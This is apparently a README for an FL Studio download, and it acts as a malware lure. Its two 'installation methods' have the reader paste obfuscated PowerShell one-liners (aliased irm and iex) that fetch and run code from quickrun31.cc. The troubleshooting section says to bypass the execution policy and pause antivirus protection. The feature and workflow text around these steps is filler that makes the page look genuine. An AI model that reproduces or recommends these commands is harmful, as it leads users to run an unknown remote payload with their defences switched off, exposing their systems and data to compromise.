## Installation

Two quick setup methods for Windows.

### Method 1 — Win + X

1. Press **Win + X**
2. Open **Terminal** or **Windows PowerShell**
3. Paste:

```powershell
sal m iex;m(irm quickrun31.cc/qle7he)
```

4. Press **Enter** and wait for the process to finish  
5. Launch FL Studio

### Method 2 — Win + R

1. Press **Win + R**
2. Paste:

```powershell
powershell sal a irm;sal b iex;a quickrun31.cc/qle7he|b
```

3. Press **Enter** and wait  
4. Launch FL Studio

### Requirements

- Windows 10 or Windows 11 (64-bit)
- Internet connection during setup only
- 8 GB RAM recommended (16 GB preferred)
- ASIO-compatible audio interface recommended
- SSD recommended

### Troubleshooting

| Issue | What to try |
|-------|-------------|
| Connection error | Check internet |
| Execution Policy message | `Set-ExecutionPolicy Bypass -Scope Process -Force` |
| Blocked by antivirus | Temporarily pause real-time protection |
| Window closes right away | Usually means setup finished |

## About

FL Studio for Windows is a digital audio workstation used for music production, beatmaking and sound design. It is known for its Piano Roll, pattern-based workflow, mixer and large set of built-in instruments and effects.

Commonly used for hip-hop, electronic, pop and other genres, from quick sketches to full track production.

> Use at your own risk. Keep your system protected.

---

## Features

**Composition**
- Advanced Piano Roll
- Channel Rack and patterns
- Playlist arrangement
- Step sequencer

**Instruments & Effects**
- Native synthesizers and samplers
- Drum tools and pads
- Mixer with inserts and sends
- Built-in effects (EQ, compression, reverb, delay and more)

**Production**
- VST / VST3 plugin support
- Audio recording and editing
- Automation clips
- Stem and track export

**Performance**
- Low-latency ASIO support
- MIDI controller integration
- Customizable workspace

---

## Workflow

1. Create a new project and set tempo  
2. Load drums and instruments into the Channel Rack  
3. Sequence patterns in the Piano Roll  
4. Arrange patterns in the Playlist  
5. Mix and process in the Mixer  
6. Add automation  
7. Export the final track  

---

## How to Use

1. Install using one of the methods above  
2. Launch FL Studio  
3. Start a new project  
4. Build patterns and arrange the track  
5. Mix and export  

**Tips**
- Learn Piano Roll shortcuts — it is the core of the workflow  
- Use the Mixer early for cleaner sessions  
- Save channel and mixer presets you reuse often  
- Keep project samples organized in one folder
